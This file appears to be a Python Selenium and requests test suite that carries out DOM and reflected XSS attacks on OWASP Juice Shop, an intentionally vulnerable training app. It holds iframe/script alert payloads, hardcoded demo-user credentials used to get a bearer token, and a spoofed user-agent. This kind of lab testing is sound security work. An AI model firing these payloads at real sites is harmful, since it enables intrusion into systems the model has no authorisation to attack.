import json
import os
import random
import requests as r
import time
import unittest

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

juice_url = os.getenv("JUICE_URL")

options = Options()
options.add_argument("headless")
options.add_argument("no-sandbox")
options.add_argument("disable-dev-shm-usage")
options.add_argument("disable-infobars")
options.add_argument("disable-background-networking")
options.add_argument("disable-default-apps")
options.add_argument("disable-extensions")
options.add_argument("disable-gpu")
options.add_argument("disable-sync")
options.add_argument("disable-translate")
options.add_argument("hide-scrollbars")
options.add_argument("metrics-recording-only")
options.add_argument("mute-audio")
options.add_argument("no-first-run")
options.add_argument("dns-prefetch-disable")
options.add_argument("safebrowsing-disable-auto-update")
options.add_argument("media-cache-size=1")
options.add_argument("disk-cache-size=1")
options.add_argument(
    "user-agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
)
browser = webdriver.Chrome(
    service=Service(executable_path=r"/usr/bin/chromedriver"), options=options
)


class TestXSS(unittest.TestCase):
    # https://pwning.owasp-juice.shop/appendix/solutions.html#perform-a-dom-xss-attack
    def test_dom_xss(self):
        browser.get(f"{juice_url}/#/search?q=apple")
        time.sleep(random.random() + random.randint(2, 4))
        browser.get(f"{juice_url}/#/search?q=<script>alert(1)</script>")
        time.sleep(random.random() + random.randint(2, 4))
        browser.get(f'{juice_url}/#/search?q=<iframe src="javascript:alert(`xss`)">')

        WebDriverWait(browser, 3).until(
            EC.alert_is_present(), "Timed out waiting for popup"
        )
        alert = browser.switch_to.alert
        alert.accept()  # should throw an exception if it fails

        self.assertTrue(True)

    def test_reflected_xss(self):
        login = {"email": "jim@juice-sh.op", "password": "ncc-1701"}
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": f"{juice_url}/",
            "Connection": "keep-alive",
            "Referer": f"{juice_url}/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        res = r.post(f"{juice_url}/rest/user/login", headers=headers, json=login)
        token = json.loads(res.text.strip())["authentication"]["token"]
        headers["Authorization"] = f"Bearer {token}"
        time.sleep(random.random() + random.randint(2, 4))

        res = r.post(
            f"{juice_url}/checkout",
            headers=headers,
            json={
                "couponData": "bnVsbA==",
                "orderDetails": {
                    "paymentId": "5",
                    "addressId": "4",
                    "deliveryMethodId": "1",
                },
            },
        )
        time.sleep(random.random() + random.randint(2, 4))

        r.get(f"{juice_url}/#/order-history")
        browser.get(
            f'{juice_url}/#/track-result?id=<iframe src%3D"javascript:alert(`xss`)">'
        )
        WebDriverWait(browser, 10).until(
            EC.alert_is_present(), "Timed out waiting for popup"
        )
        alert = browser.switch_to.alert
        alert.accept()  # should throw an exception if it fails

        self.assertTrue(True)
